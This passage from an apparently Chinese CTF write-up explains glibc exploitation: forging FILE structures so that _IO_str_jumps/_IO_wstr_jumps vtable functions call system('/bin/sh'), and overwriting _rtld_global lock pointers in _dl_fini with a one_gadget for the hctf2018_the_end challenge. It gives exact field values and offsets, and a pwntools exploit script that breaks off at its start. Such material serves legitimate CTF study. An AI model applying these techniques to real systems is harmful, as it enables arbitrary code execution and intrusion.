class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))                       <span class="comment">// 条件 #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;                                 <span class="comment">// 通过计算 new_size 为 &quot;/bin/sh\x00&quot; 的地址</span></span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);     <span class="comment">// 在这个相对地址放上 system 的地址，即 system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    [...]</span><br><span class="line"><span class="comment">// libio/strfile.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_flags = 0</li><li>fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2</li><li>fp-&gt;_IO_write_ptr = 0xffffffff</li><li>fp-&gt;_IO_write_base = 0</li><li>fp-&gt;_mode = 0</li></ul><p>有一点要注意的是，如果 bin_sh_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system(“/bin/sh”) 是可以用 one_gadget 来代替的，这样似乎更加简单。</p><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow</code>。</p><p>与传统的 house-of-orange 不同的是，这种利用方法不再需要知道 heap 的地址，因为 <code>_IO_str_jumps</code> vtable 是在 libc 上的，所以只要能泄露出 libc 的地址就可以了。</p><p>在 <code>_IO_str_jumps</code> 中，还有另一个函数 <code>_IO_str_finish</code>，它的检查条件比较简单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))             <span class="comment">// 条件</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);     <span class="comment">// 在这个相对地址放上 system 的地址</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要在 <code>fp-&gt;_IO_buf_base</code> 放上 “/bin/sh” 的地址，然后设置 <code>fp-&gt;_flags = 0</code> 就可以了绕过函数里的条件。</p><p>那么怎样让程序进入 <code>_IO_str_finish</code> 执行呢，<code>fclose(fp)</code> 是一条路，但似乎有局限。还是回到异常处理上来，在 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW</code> 执行的 <code>__GI__IO_str_overflow</code>，而 <code>_IO_OVERFLOW</code> 是根据 <code>__overflow</code> 相对于 <code>_IO_str_jumps</code> vtable 的偏移找到具体函数的。所以如果我们伪造传递给 <code>_IO_OVERFLOW(fp)</code> 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 <code>_IO_str_finish</code> 并执行。</p><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_mode = 0</li><li>fp-&gt;_IO_write_ptr = 0xffffffff</li><li>fp-&gt;_IO_write_base = 0</li><li>fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</li><li>fp-&gt;_flags2 = 0</li><li>fp-&gt;_mode = 0</li></ul><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish</code>。</p><h3 id="IO-wstr-jumps"><a href="#IO-wstr-jumps" class="headerlink" title="_IO_wstr_jumps"></a>_IO_wstr_jumps</h3><p><code>_IO_wstr_jumps</code> 也是一个符合条件的 vtable，总体上和上面讲的 <code>_IO_str_jumps</code> 差不多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/wstrops.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstr_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>利用函数 <code>_IO_wstr_overflow</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">_IO_wint_t</span><br><span class="line">_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == WEOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : WEOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))    <span class="comment">// 条件 #define _IO_wblen(fp) ((fp)-&gt;_wide_data-&gt;_IO_buf_end - (fp)-&gt;_wide_data-&gt;_IO_buf_base)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">wchar_t</span> *new_buf;</span><br><span class="line">      <span class="keyword">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;              <span class="comment">// 使 new_size * sizeof(wchar_t) 为 &quot;/bin/sh&quot; 的地址</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">          || __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="keyword">sizeof</span> (<span class="keyword">wchar_t</span>)))</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">wchar_t</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size</span><br><span class="line">                                    * <span class="keyword">sizeof</span> (<span class="keyword">wchar_t</span>));                      <span class="comment">// 在这个相对地址放上 system 的地址</span></span><br><span class="line">    [...]</span><br></pre></td></tr></table></figure><p>利用函数 <code>_IO_wstr_finish</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_wstr_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    <span class="comment">// 条件</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_wide_data-&gt;_IO_buf_base);     <span class="comment">// 在这个相对地址放上 system 的地址</span></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改-dl-fini-函数指针"><a href="#修改-dl-fini-函数指针" class="headerlink" title="修改 _dl_fini 函数指针"></a>修改 _dl_fini 函数指针</h3><p>以 hctf2018_the_end 为例子，题目部署在 Ubuntu 18，远程实验到 buu 。</p><blockquote><p>这条题目在 Ubuntu 18 下有 vtable 检查，修改 vtable 方法失效。</p><p>下面调试过程中寻找 libc 与 ld 偏移时与 buu 靶机情况不一样，因为我们本地在 docker 改 libc 运行 ld 和 libc 位置变化了，具体看后文</p></blockquote><p>exit() 函数的利用链：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212231817.png" alt="exit()"></p><p>在 exit 函数中会调用 <code>__run_exit_handlers()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/stdlib/exit.c</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>__run_exit_handlers() 调用 _dl_fini ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212231929.png" alt="image-20201212231929231"></p><p>在 _dl_fini 函数中调用调用函数 <code>__rtld_lock_lock_recursive()</code> 和 <code>__rtld_lock_unlock_recursive()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/elf/dl-fini.c</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">         auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">          || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          )</span><br><span class="line">        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p> <code>__rtld_lock_lock_recursive</code>、<code> __rtld_lock_unlock_recursive</code>是通过宏定义来的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/sysdeps/nptl/libc-lockP.h</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span><br></pre></td></tr></table></figure><p>从上面定义知道真正函数是 GL 宏中的 <code>dl_rtld_lock_recursive</code> ，查看宏 GL 定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Rtld.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_local</span></span></span><br><span class="line"><span class="class">    __<span class="title">attribute__</span> ((<span class="title">alias</span> (&quot;_<span class="title">rtld_global</span>&quot;), <span class="title">visibility</span> (&quot;<span class="title">hidden</span>&quot;)));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ldsodefs.h</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_local</span> __<span class="title">rtld_local_attribute__</span>;</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">undef</span> __rtld_local_attribute__</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">undef</span> __rtld_global_attribute__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Db_info.c</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> <span class="title">rtld_global</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//elf/Rtld.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Generally the default presumption without further information is an</span></span><br><span class="line"><span class="comment">     * executable stack but this is not true for all platforms.  */</span></span><br><span class="line">    ._dl_stack_flags = DEFAULT_STACK_PERMS,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line">    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ._dl_nns = <span class="number">1</span>,</span><br><span class="line">    ._dl_ns =</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">      [LM_ID_BASE] = &#123; ._ns_unique_sym_table</span><br><span class="line">       = &#123; .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER &#125; &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//Ldsodefs.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> EXTERN extern</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> GL(name) _##name</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> EXTERN</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>有点复杂，这里简化描述一下：从 40-45 知道 GL 是 _rtld_local 或 _rtld_global 类型的结构体；两种结构体定义看上面代码前面部分。所以 GL(dl_rtld_lock_recursive) 是 _rtld_global 结构体内的 dl_rtld_lock_recursive 指针。</p><p>有点绕，先整理下 _dl_fini 调用的实际是什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_dl_fini 调用 __rtld_lock_lock_recursive</span><br><span class="line">__rtld_lock_lock_recursive 宏定义为 GL(dl_rtld_lock_recursive)</span><br><span class="line">GL 是一个 _rtld_global 结构体</span><br><span class="line">dl_rtld_lock_recursive 是 _rtld_global 结构体的一个指针</span><br></pre></td></tr></table></figure><p><strong>_dl_fini 实际调用 _rtld_global 结构体的 _dl_rtld_lock_recursive 指针。</strong></p><p>在 gdb 中查看 _rtld_global 信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p _rtld_global#查看结构体内容</span><br><span class="line">p *_rtld_global#查看结构体地址</span><br></pre></td></tr></table></figure><p>在结构体里面找到了实际的调用的函数指针：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212010538.png" alt="image-20201212010538691"></p><p><strong>_rtld_global 是在 ld.so 内存段</strong>里面的，泄露 libc 可以通过偏移计算出 ld 基地址，按照图中偏移应该为 <code>offset=0x7f30c73af000-0x7f30c6df8000=0x5b7000</code>：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212010329.png" alt="image-20201212010329020"></p><p>由于我这里调试时改 libc 和 ld 所以计算出来的偏移 0x5b7000 并不是远程环境（原生18.04运行）下的偏移，在 Ubuntu 18.04 下重新调试计算得出偏移为 <code>0x3f1000</code> ，这个偏移与 buu 上的环境一样：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212164833.png" alt="image-20201212164833238"></p><p>计算出 _rtld_global 的地址通过偏移得到 _dl_rtld_lock_recursive 、_dl_rtld_unlock_recursive 地址。这个偏移我是 gdb 查看 _rtld_global 地址，不断加偏移找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_dl_rtld_lock_lock_recursive -&gt; <span class="number">0xf00</span></span><br><span class="line">_dl_rtld_lock_unlock_recursive -&gt; <span class="number">0xf08</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212165907.png" alt="image-20201212165906952"></p><p>两个函数都会调用，将其指针改成 onegadget ，最后尝试 _dl_rtld_unlock_recursive 才满足 onegadget 条件。</p><p><strong>EXP</strong> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#remote:ubuntu18.04</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;, &quot;./the_end&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.27/64/lib/libc-2.27.so&quot;&#125;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/glibc/2.27/64/lib/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#ld = ELF(&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># p = process(&quot;./the_end&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># ld = ELF(&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span 